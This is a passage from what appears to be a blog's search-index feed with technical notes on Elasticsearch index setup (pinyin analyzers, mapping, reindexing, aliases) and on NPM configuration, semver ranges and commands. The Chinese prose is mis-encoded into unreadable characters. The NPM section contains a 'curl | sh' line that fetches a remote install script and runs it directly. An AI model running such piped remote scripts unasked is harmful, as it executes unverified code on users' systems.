class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">curl -XPUT &#x27;http://es.kekek.cc/library_20171204?pretty=true&#x27; -d &#x27;</span><br><span class="line">&#123;</span><br><span class="line">    &quot;settings&quot;: &#123;</span><br><span class="line">        &quot;number_of_shards&quot; :   4,</span><br><span class="line">        &quot;number_of_replicas&quot; : 1,</span><br><span class="line">        &quot;index.mapping.single_type&quot;: true,</span><br><span class="line">        &quot;analysis&quot;: &#123;</span><br><span class="line">            &quot;filter&quot;:      &#123; </span><br><span class="line">                &quot;synonym_filter&quot;: &#123;</span><br><span class="line">                    &quot;type&quot;: &quot;synonym&quot;, </span><br><span class="line">                    &quot;synonyms_path&quot;: &quot;analysis/synonyms.txt&quot;</span><br><span class="line">                &#125;,</span><br><span class="line">                &quot;pinyin_filter&quot;: &#123;</span><br><span class="line">                    &quot;type&quot;: &quot;chinese-pinyin&quot;</span><br><span class="line">                &#125;,</span><br><span class="line">                &quot;length_filter&quot;: &#123;</span><br><span class="line">                    &quot;type&quot;: &quot;length&quot;,</span><br><span class="line">                    &quot;min&quot;: 2</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;,</span><br><span class="line">            &quot;analyzer&quot;:    &#123;</span><br><span class="line">                &quot;ik_smart_pinyin&quot;: &#123;</span><br><span class="line">                    &quot;type&quot;: &quot;custom&quot;,</span><br><span class="line">                    &quot;tokenizer&quot;: &quot;ik_smart&quot;,</span><br><span class="line">                    &quot;filter&quot;: [&quot;length_filter&quot;, &quot;synonym_filter&quot;, &quot;pinyin_filter&quot;]</span><br><span class="line">                &#125;,</span><br><span class="line">                &quot;ik_max_word_pinyin&quot;: &#123;</span><br><span class="line">                    &quot;type&quot;: &quot;custom&quot;,</span><br><span class="line">                    &quot;tokenizer&quot;: &quot;ik_max_word&quot;,</span><br><span class="line">                    &quot;filter&quot;: [&quot;length_filter&quot;, &quot;synonym_filter&quot;, &quot;pinyin_filter&quot;]</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; &#x27;</span><br></pre></td></tr></table></figure><ol start="2"><li>åˆ›å»º mapping</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br></pre></td><td class="code"><pre><span class="line">curl -XPUT &#x27;http://es.kekek.cc/library_20171204/_mapping/book?pretty=true&#x27; -d &#x27;</span><br><span class="line">&#123;</span><br><span class="line">    &quot;dynamic&quot;: false,</span><br><span class="line">    &quot;properties&quot;: &#123;</span><br><span class="line">        &quot;title&quot;: &#123;</span><br><span class="line">            &quot;type&quot;: &quot;string&quot;,</span><br><span class="line">            &quot;analyzer&quot;: &quot;ik_smart_pinyin&quot;,</span><br><span class="line">            &quot;search_analyzer&quot;: &quot;ik_max_word_pinyin&quot;</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;subtitle&quot;: &#123;</span><br><span class="line">            &quot;type&quot;: &quot;string&quot;,</span><br><span class="line">            &quot;analyzer&quot;: &quot;ik_smart_pinyin&quot;,</span><br><span class="line">            &quot;search_analyzer&quot;: &quot;ik_max_word_pinyin&quot;</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;author&quot;: &#123;</span><br><span class="line">            &quot;type&quot;: &quot;string&quot;,</span><br><span class="line">            &quot;analyzer&quot;: &quot;ik_smart_pinyin&quot;</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;translator&quot;: &#123;</span><br><span class="line">            &quot;type&quot;: &quot;string&quot;,</span><br><span class="line">            &quot;analyzer&quot;: &quot;ik_smart_pinyin&quot;</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;rating&quot;: &#123;</span><br><span class="line">            &quot;type&quot;: &quot;object&quot;,</span><br><span class="line">            &quot;properties&quot;: &#123;</span><br><span class="line">                &quot;max&quot;: &#123; &quot;type&quot;: &quot;integer&quot;, &quot;index&quot;: &quot;no&quot; &#125;,</span><br><span class="line">                &quot;num_raters&quot;: &#123;&quot;type&quot;: &quot;integer&quot; &#125;,</span><br><span class="line">                &quot;average&quot;: &#123;&quot;type&quot;: &quot;float&quot; &#125;,</span><br><span class="line">                &quot;min&quot;: &#123;&quot;type&quot;: &quot;integer&quot;, &quot;index&quot;: &quot;no&quot;  &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;pubdate&quot;: &#123;</span><br><span class="line">            &quot;type&quot;: &quot;date&quot;,</span><br><span class="line">            &quot;index&quot;: &quot;no&quot;</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;tags&quot;: &#123;</span><br><span class="line">            &quot;type&quot;: &quot;string&quot;,</span><br><span class="line">            &quot;index&quot;: &quot;not_analyzed&quot;</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;isbn&quot;: &#123;</span><br><span class="line">            &quot;type&quot;: &quot;string&quot;,</span><br><span class="line">            &quot;index&quot;: &quot;not_analyzed&quot;</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;isbn10&quot;: &#123;</span><br><span class="line">            &quot;type&quot;: &quot;string&quot;,</span><br><span class="line">            &quot;index&quot;: &quot;no&quot;</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;isbn13&quot;: &#123;</span><br><span class="line">            &quot;type&quot;: &quot;string&quot;,</span><br><span class="line">            &quot;index&quot;: &quot;no&quot;</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;origin_title&quot;: &#123;</span><br><span class="line">            &quot;type&quot;: &quot;string&quot;,</span><br><span class="line">            &quot;index&quot;: &quot;no&quot;</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;image&quot;: &#123;</span><br><span class="line">            &quot;type&quot;: &quot;string&quot;,</span><br><span class="line">            &quot;index&quot;: &quot;no&quot;</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;binding&quot;: &#123;</span><br><span class="line">            &quot;type&quot;: &quot;string&quot;,</span><br><span class="line">            &quot;index&quot;: &quot;no&quot;</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;pages&quot;: &#123;</span><br><span class="line">            &quot;type&quot;: &quot;integer&quot;,</span><br><span class="line">            &quot;index&quot;: &quot;no&quot;</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;images&quot;: &#123;</span><br><span class="line">            &quot;type&quot;: &quot;object&quot;,</span><br><span class="line">            &quot;properties&quot;: &#123;</span><br><span class="line">                &quot;small&quot;: &#123;</span><br><span class="line">                    &quot;type&quot;: &quot;string&quot;,</span><br><span class="line">                    &quot;index&quot;: &quot;no&quot;</span><br><span class="line">                &#125;,</span><br><span class="line">                &quot;large&quot;: &#123;</span><br><span class="line">                    &quot;type&quot;: &quot;string&quot;,</span><br><span class="line">                    &quot;index&quot;: &quot;no&quot;</span><br><span class="line">                &#125;,</span><br><span class="line">                &quot;medium&quot;: &#123;</span><br><span class="line">                    &quot;type&quot;: &quot;string&quot;,</span><br><span class="line">                    &quot;index&quot;: &quot;no&quot;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;alt&quot;: &#123;</span><br><span class="line">            &quot;type&quot;: &quot;string&quot;,</span><br><span class="line">            &quot;index&quot;: &quot;no&quot;</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;origin_id&quot;: &#123;</span><br><span class="line">            &quot;type&quot;: &quot;integer&quot;</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;publisher&quot;: &#123;</span><br><span class="line">            &quot;type&quot;: &quot;string&quot;,</span><br><span class="line">            &quot;index&quot;: &quot;no&quot;</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;url&quot;: &#123;</span><br><span class="line">            &quot;type&quot;: &quot;string&quot;,</span><br><span class="line">            &quot;index&quot;: &quot;no&quot;</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;alt_title&quot;: &#123;</span><br><span class="line">            &quot;type&quot;: &quot;string&quot;,</span><br><span class="line">            &quot;index&quot;: &quot;no&quot;</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;series_id&quot;: &#123;</span><br><span class="line">            &quot;type&quot;: &quot;integer&quot;,</span><br><span class="line">            &quot;index&quot;: &quot;no&quot;</span><br><span class="line">        &#125;, </span><br><span class="line">        &quot;series_title&quot;: &#123;</span><br><span class="line">            &quot;type&quot;: &quot;string&quot;,</span><br><span class="line">            &quot;index&quot;: &quot;no&quot;</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;price&quot;: &#123;</span><br><span class="line">            &quot;type&quot;: &quot;string&quot;,</span><br><span class="line">            &quot;index&quot;: &quot;no&quot;</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;created_at&quot;: &#123;</span><br><span class="line">            &quot;type&quot;: &quot;date&quot;</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;updated_at&quot;: &#123;</span><br><span class="line">            &quot;type&quot;: &quot;date&quot;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125; &#x27;</span><br></pre></td></tr></table></figure><ol start="3"><li>é‡å»ºç´¢å¼•</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">curl -POST &#x27;http://es.kekek.cc/_reindex&#x27; -d &#x27;</span><br><span class="line">&#123;</span><br><span class="line">    &quot;source&quot;: &#123;</span><br><span class="line">        &quot;index&quot;: &quot;books&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;dest&quot;: &#123;</span><br><span class="line">        &quot;index&quot;: &quot;library_20171204&quot;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#x27;</span><br></pre></td></tr></table></figure><ol start="4"><li>ç´¢å¼•åˆ«å</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">curl -XPUT /library_20171204/_alias/library</span><br><span class="line">curl -XDELETE /library_20171129/_alias/library</span><br><span class="line"></span><br><span class="line">curl -POST &#x27;http://es.kekek.cc/_aliases&#x27; -d &#x27;</span><br><span class="line">&#123;</span><br><span class="line">    &quot;actions&quot; : [</span><br><span class="line">        &#123; &quot;remove&quot; : &#123; &quot;index&quot; : &quot;library_20171129&quot;, &quot;alias&quot; : &quot;library&quot; &#125; &#125;,</span><br><span class="line">        &#123; &quot;add&quot; : &#123; &quot;index&quot; : &quot;library_20171204&quot;, &quot;alias&quot; : &quot;library&quot; &#125; &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125; &#x27; </span><br></pre></td></tr></table></figure><ol start="5"><li>æµ‹è¯•åˆ†è¯å™¨</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">curl -XGET &#x27;http:/es.kekek.cc/library/_analyze?pretty=true&#x27; -d &#x27; </span><br><span class="line">&#123;</span><br><span class="line">  &quot;analyzer&quot;: &quot;ik_max_word_pinyin&quot;,  </span><br><span class="line">  &quot;text&quot;: &quot;ç™½é¹¿åŸ&quot;  </span><br><span class="line">&#125; &#x27;</span><br></pre></td></tr></table></figure><ol start="6"><li>æŸ¥çœ‹æŸ¥è¯¢è®¡åˆ’</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">curl -XGET &#x27;http:/es.kekek.cc/library/_search?pretty=true&#x27; -d &#x27; </span><br><span class="line">&#123;</span><br><span class="line">    &quot;query&quot;: &#123;</span><br><span class="line">        &quot;bool&quot;: &#123;</span><br><span class="line">            &quot;must&quot;: &#123;</span><br><span class="line">                &quot;match&quot;: &#123;</span><br><span class="line">                    &quot;title&quot;: &#123;</span><br><span class="line">                        &quot;query&quot;: &quot;ç™½é¹¿åŸ&quot;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; &#x27;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> elasticsearch </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NPM</title>
      <link href="/post/npm.html"/>
      <url>/post/npm.html</url>
      
        <content type="html"><![CDATA[<h2 id="NPM"><a href="#NPM" class="headerlink" title="NPM"></a>NPM</h2><h3 id="å®‰è£…"><a href="#å®‰è£…" class="headerlink" title="å®‰è£…"></a>å®‰è£…</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -L https://www.npmjs.com/install.sh | sh</span><br></pre></td></tr></table></figure><p>sudo node bin&#x2F;npm-cli.js install -g -f</p><h3 id="é…ç½®"><a href="#é…ç½®" class="headerlink" title="é…ç½®"></a>é…ç½®</h3><p>npm è·å–é…ç½®æœ‰6ç§æ–¹å¼ï¼Œä¼˜å…ˆçº§ç”±é«˜åˆ°åº•ã€‚</p><ul><li>å‘½ä»¤è¡Œå‚æ•°ã€‚ â€“proxy <a href="http://server:portå³å°†proxyçš„å€¼è®¾ä¸ºhttp://server:portã€‚">http://server:portå³å°†proxyçš„å€¼è®¾ä¸ºhttp://server:portã€‚</a></li><li>ç¯å¢ƒå˜é‡ã€‚ ä»¥npm_config_ä¸ºå‰ç¼€çš„ç¯å¢ƒå˜é‡å°†ä¼šè¢«è®¤ä¸ºæ˜¯npmçš„é…ç½®å±æ€§ã€‚å¦‚è®¾ç½®proxyå¯ä»¥åŠ å…¥è¿™æ ·çš„ç¯å¢ƒå˜é‡npm_config_proxy&#x3D;<a href="http://server:portã€‚">http://server:portã€‚</a></li><li>ç”¨æˆ·é…ç½®æ–‡ä»¶ã€‚å¯ä»¥é€šè¿‡npm config get userconfigæŸ¥çœ‹æ–‡ä»¶è·¯å¾„ã€‚å¦‚æœæ˜¯macç³»ç»Ÿçš„è¯é»˜è®¤è·¯å¾„å°±æ˜¯$HOME&#x2F;.npmrcã€‚</li><li>å…¨å±€é…ç½®æ–‡ä»¶ã€‚å¯ä»¥é€šè¿‡npm config get globalconfigæŸ¥çœ‹æ–‡ä»¶è·¯å¾„ã€‚macç³»ç»Ÿçš„é»˜è®¤è·¯å¾„æ˜¯&#x2F;usr&#x2F;local&#x2F;etc&#x2F;npmrcã€‚</li><li>å†…ç½®é…ç½®æ–‡ä»¶ã€‚å®‰è£…npmçš„ç›®å½•ä¸‹çš„npmrcæ–‡ä»¶ã€‚</li><li>é»˜è®¤é…ç½®ã€‚ npmæœ¬èº«æœ‰é»˜è®¤é…ç½®å‚æ•°ï¼Œå¦‚æœä»¥ä¸Š5æ¡éƒ½æ²¡è®¾ç½®ï¼Œåˆ™npmä¼šä½¿ç”¨é»˜è®¤é…ç½®å‚æ•°ã€‚</li></ul><p>npm é…ç½®å‘½ä»¤æ“ä½œ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">npm config set &lt;key&gt; &lt;value&gt; [--global]</span><br><span class="line">npm config get &lt;key&gt;</span><br><span class="line">npm config delete &lt;key&gt;</span><br><span class="line">npm config list</span><br><span class="line">npm config edit</span><br><span class="line">npm get &lt;key&gt;</span><br><span class="line">npm set &lt;key&gt; &lt;value&gt; [--global]</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">With the --production flag (or when the NODE_ENV environment variable is set to production), npm will not install modules listed in devDependencies.&quot;</span><br><span class="line"></span><br><span class="line">The --only=&#123;prod[uction]|dev[development]&#125; argument will cause either only devDependencies or only non-devDependencies to be installed regardless of the NODE_ENV.&quot;</span><br></pre></td></tr></table></figure><p>npm å¸¸ç”¨é…ç½®</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">é…ç½®ä»£ç†</span><br><span class="line">npm config set proxy http://server:port</span><br><span class="line">npm config set https-proxy http://server:port</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">é…ç½®ç§æœ‰ä»“åº“</span><br><span class="line">npm config set registry &quot;https://registry.npm.taobao.org&quot;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm config set prefix &quot;/usr/local&quot;</span><br></pre></td></tr></table></figure><h3 id="ç‰ˆæœ¬çš„æ ¼å¼"><a href="#ç‰ˆæœ¬çš„æ ¼å¼" class="headerlink" title="ç‰ˆæœ¬çš„æ ¼å¼"></a>ç‰ˆæœ¬çš„æ ¼å¼</h3><p>NPMä¸­çš„åŒ…ç‰ˆæœ¬é‡‡ç”¨<a href="https://semver.org/lang/zh-CN/">semver</a>è§„èŒƒã€‚</p><p>major.minor.patch</p><p>ä¸»ç‰ˆæœ¬å·.æ¬¡ç‰ˆæœ¬å·.ä¿®è¡¥ç‰ˆæœ¬å·</p><ul><li><p>version</p><p>  å¿…é¡»åŒ¹é…æŸä¸ªç‰ˆæœ¬ã€‚</p><p>  å¦‚ï¼š1.1.2ï¼Œè¡¨ç¤ºå¿…é¡»ä¾èµ–1.1.2ç‰ˆ</p></li><li><p>&gt;version</p><p>  å¿…é¡»å¤§äºæŸä¸ªç‰ˆæœ¬ã€‚</p><p>  å¦‚ï¼š&gt;1.1.2ï¼Œè¡¨ç¤ºå¿…é¡»å¤§äº1.1.2ç‰ˆ</p></li><li><p>&gt;&#x3D;version</p><p>  å¯å¤§äºæˆ–ç­‰äºæŸä¸ªç‰ˆæœ¬ã€‚</p><p>  å¦‚ï¼š&gt;&#x3D;1.1.2ï¼Œè¡¨ç¤ºå¯ä»¥ç­‰äº1.1.2ï¼Œä¹Ÿå¯ä»¥å¤§äº1.1.2ç‰ˆæœ¬</p></li><li><p>&lt;version</p><p>  å¿…é¡»å°äºæŸä¸ªç‰ˆæœ¬ã€‚</p><p>  å¦‚ï¼š&lt;1.1.2ï¼Œè¡¨ç¤ºå¿…é¡»å°äº1.1.2ç‰ˆæœ¬</p></li><li><p>&lt;&#x3D;version</p><p>  å¯ä»¥å°äºæˆ–ç­‰äºæŸä¸ªç‰ˆæœ¬</p><p>  å¦‚ï¼š&lt;&#x3D;1.1.2ï¼Œè¡¨ç¤ºå¯ä»¥ç­‰äº1.1.2ï¼Œä¹Ÿå¯ä»¥å°äº1.1.2ç‰ˆæœ¬</p></li><li><p>~version</p><p>  å¤§æ¦‚åŒ¹é…æŸä¸ªç‰ˆæœ¬</p><p>  å¦‚æœminorç‰ˆæœ¬å·æŒ‡å®šäº†ï¼Œé‚£ä¹ˆminorç‰ˆæœ¬å·ä¸å˜ï¼Œè€Œpatchç‰ˆæœ¬å·ä»»æ„</p><p>  å¦‚æœminorå’Œpatchç‰ˆæœ¬å·æœªæŒ‡å®šï¼Œé‚£ä¹ˆminorå’Œpatchç‰ˆæœ¬å·ä»»æ„</p><p>  å¦‚ï¼š~1.1.2ï¼Œè¡¨ç¤º&gt;&#x3D;1.1.2 &lt;1.2.0ï¼Œå¯ä»¥æ˜¯1.1.2ï¼Œ1.1.3ï¼Œ1.1.4ï¼Œâ€¦..ï¼Œ1.1.n </p><p>  å¦‚ï¼š~1.1ï¼Œè¡¨ç¤º&gt;&#x3D;1.1.0 &lt;1.2.0ï¼Œå¯ä»¥æ˜¯åŒä¸Š</p><p>  å¦‚ï¼š~1ï¼Œè¡¨ç¤º&gt;&#x3D;1.0.0 &lt;2.0.0ï¼Œå¯ä»¥æ˜¯1.0.0ï¼Œ1.0.1ï¼Œ1.0.2ï¼Œâ€¦..ï¼Œ1.0.nï¼Œ1.1.nï¼Œ1.2.nï¼Œâ€¦..ï¼Œ1.n.n</p></li><li><p>^version</p><p>  å…¼å®¹æŸä¸ªç‰ˆæœ¬</p><p>  ç‰ˆæœ¬å·ä¸­æœ€å·¦è¾¹çš„é0æ•°å­—çš„å³ä¾§å¯ä»¥ä»»æ„</p><p>  å¦‚æœç¼ºå°‘æŸä¸ªç‰ˆæœ¬å·ï¼Œåˆ™è¿™ä¸ªç‰ˆæœ¬å·çš„ä½ç½®å¯ä»¥ä»»æ„</p><p>  å¦‚ï¼š^1.1.2 ï¼Œè¡¨ç¤º&gt;&#x3D;1.1.2 &lt;2.0.0ï¼Œå¯ä»¥æ˜¯1.1.2ï¼Œ1.1.3ï¼Œâ€¦..ï¼Œ1.1.nï¼Œ1.2.nï¼Œâ€¦..ï¼Œ1.n.n</p><p>  å¦‚ï¼š^0.2.3 ï¼Œè¡¨ç¤º&gt;&#x3D;0.2.3 &lt;0.3.0ï¼Œå¯ä»¥æ˜¯0.2.3ï¼Œ0.2.4ï¼Œâ€¦..ï¼Œ0.2.n</p><p>  å¦‚ï¼š^0.0ï¼Œè¡¨ç¤º &gt;&#x3D;0.0.0 &lt;0.1.0ï¼Œå¯ä»¥æ˜¯0.0.0ï¼Œ0.0.1ï¼Œâ€¦..ï¼Œ0.0.n</p></li><li><p>x-range</p><p>  xçš„ä½ç½®è¡¨ç¤ºä»»æ„ç‰ˆæœ¬</p><p>  å¦‚ï¼š1.2.xï¼Œè¡¨ç¤ºå¯ä»¥1.2.0ï¼Œ1.2.1ï¼Œâ€¦..ï¼Œ1.2.n</p></li><li><p>*-range</p><p>  ä»»æ„ç‰ˆæœ¬ï¼Œâ€â€ä¹Ÿè¡¨ç¤ºä»»æ„ç‰ˆæœ¬</p><p>  å¦‚ï¼š*ï¼Œè¡¨ç¤º&gt;&#x3D;0.0.0çš„ä»»æ„ç‰ˆæœ¬</p></li><li><p>version1 - version2</p><p>  å¤§äºç­‰äºversion1ï¼Œå°äºç­‰äºversion2</p><p>  å¦‚ï¼š1.1.2 - 1.3.1ï¼Œè¡¨ç¤ºåŒ…æ‹¬1.1.2å’Œ1.3.1ä»¥åŠä»–ä»¬ä»¶çš„ä»»æ„ç‰ˆæœ¬</p></li><li><p>range1 || range2</p><p>  æ»¡è¶³range1æˆ–è€…æ»¡è¶³range2ï¼Œå¯ä»¥å¤šä¸ªèŒƒå›´</p><p>  å¦‚ï¼š&lt;1.0.0 || &gt;&#x3D;2.3.1 &lt;2.4.5 || &gt;&#x3D;2.5.2 &lt;3.0.0ï¼Œè¡¨ç¤ºæ»¡è¶³è¿™3ä¸ªèŒƒå›´çš„ç‰ˆæœ¬éƒ½å¯ä»¥</p></li></ul><h3 id="å¸¸ç”¨å‘½ä»¤"><a href="#å¸¸ç”¨å‘½ä»¤" class="headerlink" title="å¸¸ç”¨å‘½ä»¤"></a>å¸¸ç”¨å‘½ä»¤</h3><ol><li><p>npm init   </p><p> åˆå§‹åŒ–é¡¹ç›®</p></li><li><p>npm i <packageName> [â€“save|â€“save-dev]</p><p> å®‰è£…ä¸€ä¸ªæ¨¡å— </p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">npm i express --save</span><br><span class="line">npm i express@3 --save </span><br><span class="line">npm i gulp --save-dev</span><br></pre></td></tr></table></figure><ul><li>â€“saveï¼šå®‰è£…æ¨¡å—ï¼Œå¹¶å°†ç‰ˆæœ¬å†™åˆ°<code>dependencies</code>ä¸­ã€‚</li><li>â€“save-devï¼šå®‰è£…æ¨¡å—ï¼Œå¹¶å°†ç‰ˆæœ¬å†™åˆ°<code>devDependencies</code>ä¸­ã€‚</li><li>â€“forceï¼šåŒ<code>-f</code>ï¼Œå¼ºåˆ¶é‡æ–°å®‰è£…ã€‚</li></ul></li><li><p>npm update</p><p> æ›´æ–°å·²å®‰è£…æ¨¡å—ã€‚</p></li><li><p>npm cache</p><p> NPMä»<code>registry</code>ä¸‹è½½å‹ç¼©åŒ…ä¹‹åï¼Œéƒ½å­˜æ”¾åœ¨æœ¬åœ°çš„ç¼“å­˜ç›®å½•ã€‚</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ npm cache -h</span><br><span class="line">npm cache add &lt;tarball file&gt;</span><br><span class="line">npm cache add &lt;folder&gt;</span><br><span class="line">npm cache add &lt;tarball url&gt;</span><br><span class="line">npm cache add &lt;git url&gt;</span><br><span class="line">npm cache add &lt;name&gt;@&lt;version&gt;</span><br><span class="line">npm cache clean</span><br><span class="line">npm cache verify</span><br></pre></td></tr></table></figure></li><li><p>npm outdated</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ npm outdated</span><br><span class="line">Package  Current  Wanted  Latest  Location</span><br><span class="line">debug      2.6.9   2.6.9   3.1.0  requestbin</span><br><span class="line">ejs        2.5.9   2.5.9   2.6.1  requestbin</span><br></pre></td></tr></table></figure></li><li><p>npm list</p><p> åˆ—å‡ºæ¥æ¨¡å—ä¾èµ–æ ‘</p></li><li><p>npm version </p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">npm version patch å¢åŠ ä¸€ä½è¡¥ä¸å·ï¼ˆæ¯”å¦‚ 1.1.1 -&gt; 1.1.2ï¼‰</span><br><span class="line">npm version minor å¢åŠ ä¸€ä½å°ç‰ˆæœ¬å·ï¼ˆæ¯”å¦‚ 1.1.1 -&gt; 